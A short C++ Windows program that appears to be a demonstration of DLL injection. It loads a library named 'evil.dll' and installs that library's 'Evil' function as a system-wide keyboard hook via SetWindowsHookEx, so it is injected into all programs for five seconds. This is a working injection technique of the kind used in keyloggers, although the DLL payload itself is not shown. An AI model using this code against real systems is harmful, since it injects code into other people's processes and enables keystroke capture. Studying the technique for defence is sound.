#include <windows.h>
#include <cstdio>

typedef int (__cdecl *EvilProc)();

// Set the hook using WH_KEYBOARD action
HHOOK SetHook(HOOKPROC hookProc, HINSTANCE hInstance)
{
    return SetWindowsHookEx(WH_KEYBOARD, hookProc, hInstance, 0); // dwThreadId is set to 0 to make all programs to be hooked
}

// Unhook the previously hooked action
void UnHook(HHOOK hook)
{
    UnhookWindowsHookEx(hook);
}

int main()
{
    HINSTANCE evilDll;
    EvilProc evilFunc;

    evilDll = LoadLibrary(TEXT("evil.dll"));
    evilFunc = (EvilProc) GetProcAddress(evilDll, "Evil");

    HHOOK hook = SetHook((HOOKPROC)evilFunc, evilDll);
    Sleep(5*1000);
    UnHook(hook);
    return 0;
}